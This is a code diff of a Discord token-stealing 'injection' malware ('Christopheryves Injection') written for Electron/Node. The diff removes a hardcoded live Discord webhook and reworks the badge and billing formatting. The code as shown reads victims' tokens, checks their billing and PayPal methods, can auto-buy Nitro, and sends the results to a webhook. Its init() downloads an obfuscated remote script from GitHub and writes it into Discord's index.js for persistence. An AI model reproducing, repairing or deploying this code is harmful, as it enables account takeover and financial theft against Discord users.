@@ -4,18 +4,17 @@ const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
-const encodedHook = '%https://ptb.discord.com/api/webhooks/1205615684613046352/EsXAjNAUSp548Z_aN5ygQmLuOuQmdf79_dTN3uPt-K7JZsE4S-bzANU-W_Kch3uJtwrp%'
 
 const config = {
-  webhook: atob(encodedHook),
+  webhook: '%WEBHOOK%',
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
-  ping_on_run: true, 
+  ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Christopheryves Injection', 
-  embed_icon: 'https://resmim.net/cdn/2024/02/09/ZJtetH.jpg',
-  embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/psikiyatrist/discord-injection/main/injection-obfuscated.js', 
+  embed_icon: 'https://resmim.net/cdn/2024/02/09/ZJtetH.jpg', 
+  embed_color: 0, 
+  injection_url: 'https://raw.githubusercontent.com/psikiyatrist/discord-injection/main/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -444,7 +443,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${encodedHook}')
+        res.replace('%WEBHOOK%', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
@@ -494,23 +493,21 @@ const fetchBilling = async (token) => {
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
   if (!data) return '❌';
-  const billing = [];
+  let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing.push('💳');
+          billing += '💳 ';
           break;
         case 2:
-          billing.push('<:paypal:951139189389410365>');
+          billing += '<:paypal:951139189389410365> ';
           break;
-        default:
-            billing.push('(Unknown)');
       }
     }
   });
-  if (billing.length == 0) billing.push('❌');
-  return billing.join(' ');
+  if (!billing) billing = '❌';
+  return billing;
 };
 
 const Purchase = async (token, id, _type, _time) => {
@@ -573,76 +570,57 @@ const getNitro = (flags) => {
     case 1:
       return 'Nitro Classic';
     case 2:
-      return 'Nitro';
-    case 3:
-      return 'Nitro Basic';
+      return 'Nitro Boost';
     default:
-      return '(Unknown)';
+      return 'No Nitro';
   }
 };
 
 const getBadges = (flags) => {
-    const badges = [];
-    
-    if (flags == 4194304) {
-        badges.push('Active Developer')
-        flags -= 4194304
-    }
-    if (flags == 262144) {
-        badges.push('Moderator Programs Alumni')
-        flags -= 262144
-    }
-    if (flags == 131072) {
-        badges.push('Early Verified Bot Developer')
-        flags -= 131072
-    }
-    if (flags == 16384) {
-        badges.push('Discord Bug Hunter (Golden)')
-        flags -= 16384
-    }
-    if (flags == 512) {
-        badges.push('Early Supporter')
-        flags -= 512
-    }
-    if (flags == 256) {
-        badges.push('HypeSquad Balance')
-        flags -= 256
-    }
-    if (flags == 128) {
-        badges.push('HypeSquad Brilliance')
-        flags -= 128
-    }
-    if (flags == 64) {
-        badges.push('HypeSquad Bravery')
-        flags -= 64
-    }
-    if (flags == 8) {
-        badges.push('Discord Bug Hunter (Normal)')
-        flags -= 8
-    }
-    if (flags == 4) {
-        badges.push('HypeSquad Event')
-        flags -= 4
-    }
-    if (flags == 2) {
-        badges.push('Partnered Server Owner')
-        flags -= 2
-    }
-    if (flags == 1) {
-        badges.push('Discord Staff')
-        flags -= 1
-    }
-    
-    if (flags == 0) {
-        if (badges.length == 0) {
-            badges.push('None')
-        }
-    } else {
-        badges.push('(Unknown)')
-    }
-    
-    return badges.join(', ');
-  };
+  let badges = '';
+  switch (flags) {
+    case 1:
+      badges += 'Discord Staff, ';
+      break;
+    case 2:
+      badges += 'Partnered Server Owner, ';
+      break;
+    case 131072:
+      badges += 'Verified Bot Developer, ';
+      break;
+    case 4194304:
+      badges += 'Active Developer, ';
+      break;
+    case 4:
+      badges += 'Hypesquad Event, ';
+      break;
+    case 16384:
+      badges += 'Gold BugHunter, ';
+      break;
+    case 8:
+      badges += 'Green BugHunter, ';
+      break;
+    case 512:
+      badges += 'Early Supporter, ';
+      break;
+    case 128:
+      badges += 'HypeSquad Brillance, ';
+      break;
+    case 64:
+      badges += 'HypeSquad Bravery, ';
+      break;
+    case 256:
+      badges += 'HypeSquad Balance, ';
+      break;
+    case 0:
+      badges = 'None';
+      break;
+    default:
+      badges = 'None';
+      break;
+  }
+  return badges;
+};
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
@@ -801,7 +779,7 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**PayPal Added**',
+            name: '**Paypal Added**',
             value: `Time to buy some nitro baby 😩`,
             inline: false,
           },
